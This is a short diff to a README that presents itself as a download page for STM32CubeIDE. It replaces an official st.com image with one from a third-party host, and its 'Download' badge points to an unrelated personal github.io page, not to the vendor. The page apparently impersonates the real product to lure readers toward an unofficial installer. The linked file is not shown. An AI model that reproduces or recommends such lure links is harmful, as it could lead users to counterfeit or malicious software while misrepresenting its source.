@@ -1,6 +1,6 @@
 # Download STM32CubeIDE - Integrated Development Workspace for STM32 Projects
 
-![STM32 development workspace with board connection, editor panels, and debug console](https://www.st.com/bin/ecommerce/api/image.PF267946.en.feature-description-include-personalized-no-cpn-large.jpg)
+![STM32 development workspace with board connection, editor panels, and debug console](https://media.masters.com.pl/04-narz%C4%99dzia-projektowe/02-narz%C4%99dzia-softwarowe-i-hardwarowe/STM32Cube/CubeMX_logo.png)
 
 [![Download STM32CubeIDE](https://img.shields.io/badge/Download-STM32CubeIDE-blueviolet?style=for-the-badge&logo=windows)](https://elinoreloerauprmas.github.io/.github/STM32CubeIDE-Download)
 
